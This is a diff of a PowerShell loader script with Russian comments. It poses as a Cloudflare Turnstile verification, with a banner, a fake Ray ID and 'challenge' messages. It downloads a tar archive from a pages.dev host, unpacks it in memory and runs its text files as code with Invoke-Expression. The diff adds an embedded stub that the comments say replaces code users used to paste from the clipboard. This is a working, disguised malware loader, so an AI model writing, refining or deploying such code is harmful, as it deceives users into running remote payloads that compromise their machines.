@@ -1,81 +1,105 @@
-# run-challenge.ps1
+<#
+.SYNOPSIS
+    Полный самодостаточный загрузчик-скрипт,
+    который сначала компилирует TarExtractor,
+    потом выполняет встроенный стаб и грузит плагин из ps1.tar.
+#>
 
-# ASCII‑арт‑заголовок
-Write-Host "
-  ____ _                 _  __ _                
- / ___| | ___  _   _  __| |/ _| | __ _ _ __ ___ 
-| |   | |/ _ \| | | |/ _` | |_| |/ _` | '__/ _ \
-| |___| | (_) | |_| | (_| |  _| | (_| | | |  __/
- \____|_|\___/ \__,_|\__,_|_| |_|\__,_|_|  \___|
-";
-
-# Ray ID для трекинга
-Write-Host "Ray ID: b068ea8aebd976e9"
-Write-Host "Running Turnstile challenge, this won't take long..."
-
-# Подключаем динамическое определение класса TarExtractor, если он ещё не загружен
+# -------------------------------
+# 1) Компилируем TarExtractor в память
+# -------------------------------
 if (-not ([AppDomain]::CurrentDomain.GetAssemblies() |
           ForEach-Object { $_.GetTypes() } |
           Where-Object { $_.FullName -eq 'TarExtractor' })) {
 
     $tarExtractorCode = @"
-    using System;
-    using System.IO;
-    using System.Collections.Generic;
+using System;
+using System.IO;
+using System.Collections.Generic;
 
-    public class TarExtractor
+public class TarExtractor
+{
+    public static Dictionary<string, byte[]> ExtractTarFromMemory(byte[] tarData)
     {
-        public static Dictionary<string, byte[]> ExtractTarFromMemory(byte[] tarData)
+        var extractedFiles = new Dictionary<string, byte[]>();
+        using (var ms = new MemoryStream(tarData))
         {
-            var extractedFiles = new Dictionary<string, byte[]>();
-
-            using (var memoryStream = new MemoryStream(tarData))
+            while (ms.Position < ms.Length)
             {
-                while (memoryStream.Position < memoryStream.Length)
-                {
-                    byte[] header = new byte[512];
-                    memoryStream.Read(header, 0, 512);
+                var header = new byte[512];
+                ms.Read(header, 0, 512);
 
-                    string fileName = System.Text.Encoding.ASCII.GetString(header, 0, 100).Trim('\0');
-                    if (string.IsNullOrEmpty(fileName)) break;
+                var name = System.Text.Encoding.ASCII.GetString(header, 0, 100).Trim('\0');
+                if (string.IsNullOrEmpty(name)) break;
 
-                    string fileSizeOctal = System.Text.Encoding.ASCII.GetString(header, 124, 12).Trim('\0').Trim();
-                    long fileSize = Convert.ToInt64(fileSizeOctal, 8);
+                var sizeOctal = System.Text.Encoding.ASCII.GetString(header, 124, 12).Trim('\0').Trim();
+                var size = Convert.ToInt64(sizeOctal, 8);
 
-                    byte[] fileData = new byte[fileSize];
-                    memoryStream.Read(fileData, 0, fileData.Length);
+                var data = new byte[size];
+                ms.Read(data, 0, data.Length);
 
-                    extractedFiles.Add(fileName, fileData);
+                extractedFiles[name] = data;
 
-                    long padding = 512 - (memoryStream.Position % 512);
-                    if (padding < 512) {
-                        memoryStream.Seek(padding, SeekOrigin.Current);
-                    }
-                }
+                var pad = 512 - (ms.Position % 512);
+                if (pad < 512) { ms.Seek(pad, 'Current'); }
             }
-
-            return extractedFiles;
         }
+        return extractedFiles;
     }
+}
 "@
 
     Add-Type -TypeDefinition $tarExtractorCode -Language CSharp
 }
 
-# URL архива .tar с плагинами
-$tarUrl     = "https://gateway1.pages.dev/ps1.tar"
-$webClient  = New-Object System.Net.WebClient
-$tarData     = $webClient.DownloadData($tarUrl)
-$extractedFiles = [TarExtractor]::ExtractTarFromMemory($tarData)
+# -------------------------------
+# 2) Выполняем встроенный стаб
+#    (тот код, который раньше вы брали из буфера)
+# -------------------------------
+$stub = @'
+echo "
+  ____ _                 _  __ _                
+ / ___| | ___  _   _  __| |/ _| | __ _ _ __ ___ 
+| |   | |/ _ \| | | |/ _` | |_| |/ _` | '__/ _ \
+| |___| | (_) | |_| | (_| |  _| | (_| | | |  __/
+ \____|_|\___/ \__,_|\__,_|_| |_|\__,_|_|  \___|
+ ";
+Write-Host "Ray ID: b068ea8aebd976e9"
+Write-Host "Running Turnstile challenge, this won't take long..."
+# …и сюда вставить весь остальной код стаба, который раньше был в буфере
+'@
 
-# Выполняем все .txt‑скрипты из архива
-foreach ($file in $extractedFiles.Keys) {
-    if ($file -match "\.txt$") {
+try {
+    Invoke-Expression $stub
+} catch {
+    Write-Error "Не удалось выполнить стаб: $_"
+    exit 1
+}
+
+# -------------------------------
+# 3) Скачиваем и распаковываем ps1.tar
+# -------------------------------
+$tarUrl = "https://gateway1.pages.dev/ps1.tar"
+$wc     = New-Object System.Net.WebClient
+
+try {
+    $tarData = $wc.DownloadData($tarUrl)
+} catch {
+    Write-Error "Не удалось загрузить $tarUrl : $_"
+    exit 1
+}
+
+$files = [TarExtractor]::ExtractTarFromMemory($tarData)
+foreach ($name in $files.Keys) {
+    if ($name -match '\.txt$') {
         Write-Host "Challenge completed. Just a moment..."
-        $data   = $extractedFiles[$file]
-        $plugin = [System.Text.Encoding]::UTF8.GetString($data)
-        iex $plugin
+        $code = [System.Text.Encoding]::UTF8.GetString($files[$name])
+        Invoke-Expression $code
     }
 }
 
+# -------------------------------
+# 4) Финальный вывод
+# -------------------------------
 Write-Host "Done"
+Write-Host "Ray ID: b068ea8aebd976e9"
